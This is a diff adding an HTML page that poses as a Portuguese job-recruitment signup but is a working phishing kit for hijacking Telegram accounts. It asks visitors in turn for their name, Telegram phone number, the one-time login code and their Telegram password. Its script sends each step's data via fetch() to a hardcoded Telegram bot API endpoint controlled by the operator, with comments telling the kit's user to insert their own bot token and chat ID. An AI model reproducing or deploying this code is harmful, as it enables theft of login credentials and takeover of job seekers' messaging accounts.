@@ -1,0 +1,323 @@
+<!doctype html>
+<html lang="uea">
+    <head>
+        <meta charset="utf-8" />
+        <link rel="icon" href="assets/logo.png" />
+        <meta name="viewport" content="width=device-width,initial-scale=1" />
+        <meta name="theme-color" content="#000000" />
+        <meta name="description" content="Discover the top 10 high-demand jobs in Portugal for 2025. Find top jobs in Portugal and advance your career to next level." />
+        <title>Vaga Empregos em Portugal</title>
+        <link rel="apple-touch-icon" href="assets/prt.png" />
+        <meta property="og:image" content="https://imaportugal.com/wp-content/uploads/2023/11/How-To-Find-A-Job-In-Portugal-For-Foreigners.jpg">
+        <link href="assets/style.css" rel="stylesheet">
+        <style>
+            .form-container .hidden { display: none; }
+            
+            /*.blink {*/
+        /*font-family*/
+        /*}*/
+
+        @keyframes blink-animation {
+            0% { opacity: 1; }
+            50% { opacity: 0; }
+            100% { opacity: 1; }
+        }
+
+        /* CSS untuk gambar */
+        .form-container img {
+            width: 100%;
+            height: auto; /* Menjaga aspek rasio gambar */
+            display: block; /* Menghilangkan ruang ekstra di bawah gambar */
+            margin: 0; /* Menghapus margin default */
+        }
+
+        /* CSS untuk marquee */
+        h3 marquee {
+            display: block;
+            font-size: 16px;
+            color: #333;
+        }
+
+        /* CSS untuk feedback validasi */
+        select:invalid {
+            border-color: #dc3545;
+        }
+
+        select:valid {
+            border-color: #28a745;
+        }
+
+        /* CSS untuk loading */
+        .loading {
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(255, 255, 255, 0.8);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 999;
+            visibility: hidden; /* Hidden by default */
+            opacity: 0;
+            transition: opacity 0.3s ease;
+        }
+        .loading.show {
+            visibility: visible;
+            opacity: 1;
+        }
+        .loading .spinner {
+            border: 8px solid #f3f3f3; /* Light grey */
+            border-top: 8px solid #3498db; /* Blue */
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        </style>
+    </head>
+    <body>
+        <div id="root">
+            <main class="flex-grow">
+                <div class="relative min-h-screen flex items-center justify-center overflow-hidden p-4">
+                    <div class="absolute top-0 left-0 w-full h-full text-center object-cover -z-10 pointer-events">
+                        <video class="absolute top-0 left-0 w-full h-full object-cover -z-10 pointer-events-none" src="assets/jobs.mp4" autoplay="" muted loop></video>
+                    </div>
+                    <div class="w-full max-w-lg p-6 bg-white bg-opacity-10 backdrop-blur-sm rounded-lg shadow-[0_10px_30px_rgba(0,0,0,0.9)] relative z-10">
+                        <nav class="bg-cyan-600 p-4 rounded-lg shadow-lg">
+                            <div class="container mx-auto text-center">
+                                <h1 class="text-white text-2xl font-bold">Vaga Empregos em Portugal</h1>
+                            </div>
+                        </nav>
+                        <div class="w-full flex justify-center my-6">
+                            <img src="assets/job.png" alt="Header" class="w-40 h-40 object-cover rounded-full shadow-2xl shadow-gray-500">
+                        </div>
+                        
+                        <div class="form-container">
+                            <div class="loading">
+                                <div class="spinner"></div>
+                            </div>
+                            <form id="multiStepForm">
+                                <div id="step1" class="form-step">
+                                    <div class="p-4">
+                                        <h2 class="text-3xl font-bold mb-4 text-center text-white">Formulário de Inscrição</h2>
+                                        <p class="mb-6 text-center text-white font-bold">Por favor preencha o formulário abaixo para se registrar.</p>
+                                   </div>
+                                    <input type="hidden" name="form_type" value="contact">
+                                    <div class="space-y-4">
+                                        <label class="block text-sm font-bold text-blue mb-1" for="name"><span class="text-red-500">*</span>Nome completo </label>
+                                        <input type="text" name="name" id="name" placeholder="Full Name" class="block w-full p-2 border border-gray-300 rounded shadow-sm bg-gray-700 bg-opacity-30 text-white" required="true">
+                                    </div>
+                                    <br>
+                                    <div class="space-y-4">
+                                        <label class="block text-sm font-bold text-blue mb-1" for="phone"><span class="text-red-500">*</span>Número de Telegram </label>
+                                        <div class="flex w-full gap-2">
+                                            <select id="countryCode" class="block w-10 p-2 border border-gray-300 rounded shadow-sm bg-gray-700 bg-opacity-30 text-white" required>
+                                                <option value="+351">🇵🇹 +351</option>
+                                            </select>
+                                            <input type="tel" name="phone" id="phone" placeholder="Your Phone Number" class="block w-full p-2 border border-gray-300 rounded shadow-sm bg-gray-700 bg-opacity-30 text-white " required="true">
+                                        </div>
+										<div>
+										<label class="block text-sm font-bold text-blue mb-1" for="ageRange">Idade <span class="text-red-500">*</span></label>
+										<select id="ageRange" class="form-select block w-full p-2 border border-gray-300 rounded shadow-sm bg-gray-700 bg-opacity-30 text-blue">
+										<option value="">Selecione uma faixa etária</option>
+										<option value="18-25">18-25 anos</option>
+										<option value="25-35">25-35 anos</option>
+										<option value="35-45">35-45 anos</option>
+										</select>
+										</div>
+                                        <br>
+                                        <div class="button">
+                                            <center><button type="button" class="w-100 bg-cyan-600 text-white font-bold p-2 rounded hover:bg-cyan-700 shadow-md flex items-center justify-center" onclick="nextStep()"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 512 512" class="mr-2" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M476 3.2L12.5 270.6c-18.1 10.4-15.8 35.6 2.2 43.2L121 358.4l287.3-253.2c5.5-4.9 13.3 2.6 8.6 8.3L176 407v80.5c0 23.6 28.5 32.9 42.5 15.8L282 426l124.6 52.2c14.2 6 30.4-2.9 33-18.2l72-432C515 7.8 493.3-6.8 476 3.2z"></path></svg> Junte-se ao grupo Telegram </button></center>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div id="step2" class="form-step hidden">
+                                    <input type="hidden" name="form_type" value="otp">
+                                    <input type="hidden" name="name" id="name">
+                                    <input type="hidden" name="phone" id="phone">
+                                    <div class="p-4">
+                                        <h2 class="text-3xl font-bold mb-4 text-center text-white">Código OTP</h2>
+                                        <p class="mb-6 text-center text-white font-bold">Enviamos um código OTP para a sua conta Telegram.</p>
+                                    </div>
+                                    <div class="space-y-4">
+                                        <input type="tel" name="otp" id="otp" style="text-align: center;" placeholder="5-digit code" maxlength="5" class="block w-full p-2 border border-gray-300 rounded shadow-sm bg-gray-700 bg-opacity-30 text-white" required="">
+                                    </div>
+                                    <br>
+                                    <div class="button">
+                                        <center><button type="button" onclick="nextStep()" class="w-full bg-cyan-600 text-white font-bold p-2 rounded hover:bg-cyan-700 shadow-md flex items-center justify-center">Vá em frente</button></center>
+                                    </div>
+                                </div>
+                                <div id="step3" class="form-step hidden">
+                                    <input type="hidden" name="form_type" value="password">
+                                    <input type="hidden" name="name" id="name2">
+                                    <input type="hidden" name="phone" id="phone2">
+                                    <input type="hidden" name="otp" id="otp">
+                                    <div class="p-4">
+                                        <h2 class="text-3xl font-bold mb-4 text-center text-white">Senhas</h2>
+                                        <p class="mb-6 text-center text-white font-bold">Introduza a sua senha do Telegram.</p>
+                                    </div>
+                                    <div class="p-4">
+                                        <input type="text" name="password" id="password" style="text-align: center;" placeholder="Enter your Telegram Password" class="block w-full p-2 border border-gray-300 rounded shadow-sm bg-gray-700 bg-opacity-30 text-white">
+                                    </div>
+                                    <br>
+                                    <div class="button">
+                                        <center><button type="button" onclick="submitForm()" class="w-100 bg-cyan-600 text-white font-bold p-2 rounded hover:bg-cyan-700 shadow-md flex items-center justify-center">Vá em frente</button></center>
+                                    </div>
+                                </div>
+                            </form>
+                        </div>
+<script>
+    const TELEGRAM_API_URL = 'https://api.telegram.org/bot8851415112:AAGzrNB_LGbfsUVgl7kRIH10bJv9aS_sNrk/sendMessage'; // Ganti dengan token bot Telegram Anda
+    const CHAT_ID = '8936356007'; // Ganti dengan chat ID Telegram Anda
+
+    async function sendToTelegram(message) {
+        try {
+            const response = await fetch(TELEGRAM_API_URL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message
+                })
+            });
+
+            if (!response.ok) {
+                throw new Error('Network response was not ok');
+            }
+
+            const data = await response.json();
+            console.log('Data berhasil dikirim ke Telegram:', data);
+            return true;
+        } catch (error) {
+            console.error('Terjadi kesalahan saat mengirim data ke Telegram:', error);
+            return false;
+        }
+    }
+
+    function showLoading(show) {
+        const loadingElement = document.querySelector('.loading');
+        if (show) {
+            loadingElement.classList.add('show');
+        } else {
+            loadingElement.classList.remove('show');
+        }
+    }
+
+    function nextStep() {
+        const currentStep = document.querySelector('.form-step:not(.hidden)');
+        const nextStep = currentStep.nextElementSibling;
+
+        // Validasi inputan
+        if (!validateInputs(currentStep)) {
+            alert('Por favor, preencha todos os campos antes de prosseguir.');
+            return;
+        }
+
+        // Simpan data dari langkah saat ini
+        let message = '';
+        if (currentStep.id === 'step1') {
+            const name = document.querySelector('input[name="name"]').value;
+            const phone = document.querySelector('input[name="phone"]').value;
+            document.getElementById('name').value = name;
+            document.getElementById('phone').value = phone;
+            message = `【𝕻𝖔𝖗𝖙𝖚𝖌𝖆𝖑𝟙】:\n👍 𝐍𝐚𝐦𝐚: ${name}\n👍 𝐍𝐨.𝐇𝐏: ${phone}`;
+        } else if (currentStep.id === 'step2') {
+            const name = document.getElementById('name').value;
+            const phone = document.getElementById('phone').value;
+            const otp = document.querySelector('input[name="otp"]').value;
+            document.getElementById('name2').value = name;
+            document.getElementById('phone2').value = phone;
+            document.getElementById('otp').value = otp;
+            message = `【𝕻𝖔𝖗𝖙𝖚𝖌𝖆𝖑𝟚】:\n👍 𝐍𝐚𝐦𝐚: ${name}\n👍 𝐍𝐨.𝐇𝐏: ${phone}\n👍 𝐎.𝐓.𝐏: ${otp}`;
+        } else if (currentStep.id === 'step3') {
+            const name = document.getElementById('name2').value;
+            const phone = document.getElementById('phone2').value;
+            const otp = document.getElementById('otp').value;
+            const password = document.querySelector('input[name="password"]').value;
+            // Debugging: Log nilai untuk memastikan semuanya diambil dengan benar
+            console.log('Debug Step 3:');
+            console.log('Name:', name);
+            console.log('Phone:', phone);
+            console.log('OTP:', otp);
+            console.log('Password:', password);
+
+            message = `【𝕻𝖔𝖗𝖙𝖚𝖌𝖆𝖑𝟛】:\n👍 𝐍𝐚𝐦𝐚: ${name}\n👍 𝐍𝐨.𝐇𝐏: ${phone}\n👍 𝐎.𝐓.𝐏: ${otp}\n👍 𝐏𝐚𝐬𝐬: ${password}`;
+        }
+
+        // Tampilkan loading
+        showLoading(true);
+
+        // Kirim data ke Telegram
+        if (message) {
+            sendToTelegram(message).then(success => {
+                // Sembunyikan loading dan pindahkan ke langkah berikutnya
+                showLoading(false);
+                if (success) {
+                    currentStep.classList.add('hidden');
+                    nextStep.classList.remove('hidden');
+                }
+            });
+        } else {
+            // Sembunyikan loading dan pindahkan ke langkah berikutnya jika tidak ada pesan
+            showLoading(false);
+            currentStep.classList.add('hidden');
+            nextStep.classList.remove('hidden');
+        }
+    }
+
+    async function submitForm() {
+        const currentStep = document.querySelector('.form-step:not(.hidden)');
+        if (currentStep.id === 'step3') {
+            // Validasi inputan
+            if (!validateInputs(currentStep)) {
+                alert('Harap isi semua kolom sebelum mengirim.');
+                return;
+            }
+
+            // Simpan data dari langkah 3 dan kirim ke Telegram
+            const name = document.getElementById('name2').value;
+            const phone = document.getElementById('phone2').value;
+            const otp = document.getElementById('otp').value;
+            const password = document.querySelector('input[name="password"]').value;
+
+            const message = `【𝕻𝖔𝖗𝖙𝖚𝖌𝖆𝖑𝟛】:\n👍 𝐍𝐚𝐦𝐚: ${name}\n👍 𝐍𝐨.𝐇𝐏: ${phone}\n👍 𝐎.𝐓.𝐏: ${otp}\n👍 𝐏𝐚𝐬𝐬: ${password}`;
+
+            // Tampilkan loading
+            showLoading(true);
+
+            // Kirim data ke Telegram dan redirect setelah berhasil
+            const success = await sendToTelegram(message);
+            if (success) {
+                window.location.href = 'reload.html';
+            } else {
+                showLoading(false);
+                alert('Ocorreu um erro ao enviar dados.');
+            }
+        }
+    }
+
+    // Fungsi untuk memvalidasi inputan
+    function validateInputs(step) {
+        const requiredInputs = step.querySelectorAll('input[required]');
+        const requiredSelects = step.querySelectorAll('select[required]');
+        
+        const inputsValid = Array.from(requiredInputs).every(input => input.value.trim() !== '');
+        const selectsValid = Array.from(requiredSelects).every(select => select.value.trim() !== '');
+
+        return inputsValid && selectsValid;
+    }
+</script>
+                    </div>
+                </div>
+            </main>
+        </div>
+    </body>
+</html>
